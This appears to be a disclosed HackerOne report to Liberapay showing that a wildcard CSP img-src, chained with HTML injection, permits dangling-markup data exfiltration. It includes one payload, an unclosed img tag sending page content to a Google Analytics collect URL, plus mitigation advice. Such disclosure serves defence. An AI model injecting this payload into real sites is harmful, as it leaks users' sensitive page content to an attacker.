# Current CSP Policy chained with HTML Injection can lead to Data Exfiltration

## Report Details
- **Report ID**: 360864
- **URL**: https://hackerone.com/reports/360864
- **State**: Closed
- **Severity**: none
- **Submitted**: 2018-06-01T17:25:20.828Z
- **Disclosed**: 2018-06-04T11:52:36.945Z

## Reporter
- **Username**: oroborus
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: liberapay

## Vulnerability Information
Hi Team,

#### Summary
While reviewing the CSP headers for en.liberapay.com i noticed that img-src has a source set to * which means any source on the internet. The following is found in the current CSP Header config.

```img-src * blob: data:```

### Description:
If the site is vulnerable to HTML Injection its possible to use sources like www.google-analytics.com and inject a malicious html like the below

```html
<img src='https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=
```
If you notice the injected img src attribute i dint close the tag, so eventually a tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on pages. If a victim opens any such injected page, his information from the html response will be send to attackers google-analytics account as a get request due to the injected <img src> tag. Attacker can login into his analytics account and review all log event actions and he will have the html responses of all the victims visited.

### Mitigation:
If you feel that the site doesn't need to load images from google-analytics, remove the google-analytics from the img-src attribute of the CSP. Alternatively if you feel you need it then It is recommended to remove google-analytics from the img-src attribute and use it on connect-src and use XHR based approach - (https://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms)


### References:
Github  https://githubengineering.com/githubs-post-csp-journey
Hackerone  https://hackerone.com/reports/199779
Detectify (good explanation)  https://labs.detectify.com/2018/01/19/google-analytics-data-extraction

## Impact

This CSP bypass vector can be used to leverage attacks like sensitive data-exfiltration , cross site script include resulting in malicious java-script execution etc.

Regards,
Nthack

## Attachments
No attachments
